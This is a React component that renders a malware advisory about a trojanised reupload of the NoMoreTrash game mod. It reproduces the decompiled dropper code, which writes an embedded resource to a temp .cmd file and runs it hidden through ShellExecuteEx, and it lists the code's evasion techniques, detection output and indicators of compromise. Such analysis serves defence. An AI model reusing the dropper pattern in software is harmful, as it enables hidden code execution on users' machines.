export default function NoMoreTrashMalwareAnalysisContent() {
  return (
    <>
      <div className="bg-red-500/10 border-2 border-red-500/50 rounded-lg p-6 mb-6">
        <p className="text-xl font-bold text-red-200 mb-3">⚠️ IMPORTANT DISCLAIMER</p>
        <p className="text-gray-200 mb-4">
          This advisory analyzes a malicious <strong>reupload</strong> of a legitimate mod. The original <strong>NoMoreTrash</strong> mod and its author are legitimate and safe.
        </p>
        <p className="text-gray-200">
          A malicious actor downloaded/stole the original mod, injected malware into it, and reuploaded it to Nexus Mods under the same or similar name. If you are using the authentic original version from the legitimate author, you are safe. <strong>Only this specific malicious reupload is dangerous.</strong>
        </p>
      </div>

      <p className="text-lg text-gray-300 mb-6">
        The mod is nearly identical in technique to CustomTV_IL2CPP, using embedded resources and Windows API calls to execute malicious payloads.
      </p>

      <hr className="border-gray-800 my-8" />

      <h2 id="malicious-behavior" className="text-2xl font-bold text-white mb-4">Malicious Behavior</h2>
      
      <p className="text-gray-300 mb-4">
        Upon initialization, the mod extracts an embedded "Melon" resource and executes it using ShellExecuteEx:
      </p>

      <pre className="bg-gray-950 border border-gray-800 rounded-lg p-4 overflow-x-auto mb-6">
        <code className="text-sm text-gray-300">
{`// OnInitializeMelon() - Extracts and executes embedded payload
// Step 1: Get embedded "Melon" resource
Stream resource = Assembly.GetExecutingAssembly()
    .GetManifestResourceStream("Melon");

if (resource != null)
{
    // Step 2: Create random temp file
    string tempPath = Path.Combine(
        Path.GetTempPath(),
        string.Format("{0}.cmd", Guid.NewGuid())
    );
    
    // Step 3: Write resource to file
    using (FileStream fs = new FileStream(tempPath, FileMode.Create))
    {
        resource.CopyTo(fs);
    }
    
    // Step 4: Execute via ShellExecuteEx
    SHELLEXECUTEINFO info = new SHELLEXECUTEINFO();
    info.cbSize = Marshal.SizeOf(typeof(SHELLEXECUTEINFO));
    info.fMask = 64;
    info.lpVerb = "open";
    info.lpFile = tempPath;
    info.nShow = 0; // Hidden
    ShellExecuteEx(ref info);
}`}
        </code>
      </pre>

      <h3 className="text-lg font-semibold text-white mb-3">Identical Technique</h3>
      <p className="text-gray-300 mb-4">
        This mod uses the exact same attack pattern as CustomTV_IL2CPP:
      </p>
      <ul className="list-disc pl-6 space-y-2 text-gray-300 mb-6">
        <li><strong>Same API:</strong> shell32.dll ShellExecuteEx via DllImport</li>
        <li><strong>Same Pattern:</strong> Extract resource → Temp file → Execute</li>
        <li><strong>Same Randomization:</strong> Guid.NewGuid() for temp filenames</li>
        <li><strong>Same Concealment:</strong> Hidden execution (nShow = 0)</li>
      </ul>

      <hr className="border-gray-800 my-8" />

      <h2 id="detection" className="text-2xl font-bold text-white mb-4">MLVScan Detection</h2>
      
      <p className="text-gray-300 mb-4">
        MLVScan detected this threat using the same rules as CustomTV_IL2CPP:
      </p>

      <pre className="bg-gray-950 border border-gray-800 rounded-lg p-4 overflow-x-auto mb-6">
        <code className="text-sm text-gray-300">
{`[Critical] Detected high-risk DllImport of shell32.dll with 
       suspicious function ShellExecuteEx
  Rule: DllImportRule
  Location: Southwards.ShellExecuteEx
  
[High] Detected embedded resource extraction
  Rule: ResourceExtractionRule
  Resource Name: "Melon"`}
        </code>
      </pre>

      <h3 className="text-lg font-semibold text-white mb-3">Community Response</h3>
      <p className="text-gray-300 mb-4">
        The Schedule 1 modding Discord community actively monitors the Schedule 1 category on Nexus Mods. When this malware was detected, community members immediately analyzed and reported it. The presence of a Discord link in the malware logs was noted and reported to Discord Trust & Safety. Beyond reporting to Nexus Mods, the community also reports malicious infrastructure to registrars and hosting providers.
      </p>

      <hr className="border-gray-800 my-8" />

      <h2 id="recommendations" className="text-2xl font-bold text-white mb-4">Recommendations</h2>
      
      <h3 className="text-xl font-semibold text-white mb-2">For Users Who Downloaded This Mod</h3>
      <div className="bg-orange-500/10 border border-orange-500/30 rounded-lg p-4 mb-6">
        <p className="text-orange-200 font-medium mb-2">⚠️ If you installed this mod:</p>
        <ul className="list-disc pl-6 space-y-1 text-gray-300">
          <li><strong>Immediately uninstall</strong> and delete all mod files</li>
          <li><strong>Check %TEMP% directory</strong> for .cmd files with GUID names</li>
          <li><strong>Run a full antivirus scan</strong></li>
          <li><strong>Change all passwords</strong> (Steam, banking, email)</li>
          <li><strong>Consider wiping and reinstalling Windows</strong></li>
        </ul>
      </div>

      <h3 className="text-xl font-semibold text-white mb-2">For All Users</h3>
      <ul className="list-disc pl-6 space-y-2 text-gray-300 mb-6">
        <li><strong>Always scan mods</strong> with MLVScan before installation</li>
        <li><strong>Watch for shell32.dll imports</strong> - this is a major red flag</li>
        <li><strong>Be suspicious of embedded resources</strong> with generic names</li>
        <li><strong>Report suspicious Discord links</strong> to Discord Trust & Safety</li>
      </ul>

      <hr className="border-gray-800 my-8" />

      <h2 id="technical-analysis" className="text-2xl font-bold text-white mb-4">Technical Analysis</h2>
      
      <h3 className="text-lg font-semibold text-white mb-3">Indicators of Compromise (IOCs)</h3>
      <ul className="list-disc pl-6 space-y-2 text-gray-300 mb-6">
        <li><strong>Mod Name:</strong> NoMoreTrash / NoMoreTrashMod</li>
        <li><strong>File Name:</strong> NoMoreTrash.dll</li>
        <li><strong>Embedded Resource:</strong> "Melon"</li>
        <li><strong>Temp Pattern:</strong> %TEMP%\{'{GUID}'}.cmd</li>
        <li><strong>API Import:</strong> shell32.dll!ShellExecuteEx (Southwards namespace)</li>
        <li><strong>Creator:</strong> "Voidane"</li>
        <li><strong>Discord:</strong> discord.gg/XB7ruKtJje</li>
        <li><strong>Package:</strong> "com.voidane.nomoretrash"</li>
      </ul>

      <h3 className="text-lg font-semibold text-white mb-3">Evasion Techniques</h3>
      <ul className="list-disc pl-6 space-y-2 text-gray-300 mb-6">
        <li><strong>Embedded Payload:</strong> No network connection required</li>
        <li><strong>Randomized Filenames:</strong> GUID-based names evade detection</li>
        <li><strong>Native API:</strong> DllImport bypasses managed security</li>
        <li><strong>Hidden Execution:</strong> nShow = 0 (SW_HIDE)</li>
        <li><strong>Legitimate Camouflage:</strong> Includes Harmony patching to appear legitimate</li>
      </ul>

      <hr className="border-gray-800 my-8" />

      <h2 id="references" className="text-2xl font-bold text-white mb-4">References</h2>
      <ul className="list-disc pl-6 space-y-2 text-gray-300">
        <li>Nexus Mods Report: Mod removed, user banned</li>
        <li>Analysis Tool: MLVScan with DllImport detection</li>
        <li>Related Advisory: CustomTV_IL2CPP (same attack pattern)</li>
        <li>Sample Hash: [Available upon request to security researchers]</li>
      </ul>
    </>
  )
}
